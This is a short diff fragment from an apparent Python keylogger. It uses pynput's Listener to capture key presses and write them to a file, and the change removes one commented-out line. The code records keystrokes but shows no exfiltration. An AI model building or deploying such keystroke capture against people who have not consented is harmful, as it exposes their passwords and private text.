@@ -25,6 +25,5 @@ def writing():
             if (x=='Key.enter'):
                 x="\n"
             f.write(x)
-        #f.write('\n')
 with Listener(on_press=on_press, on_release=on_release) as listener:
     listener.join()
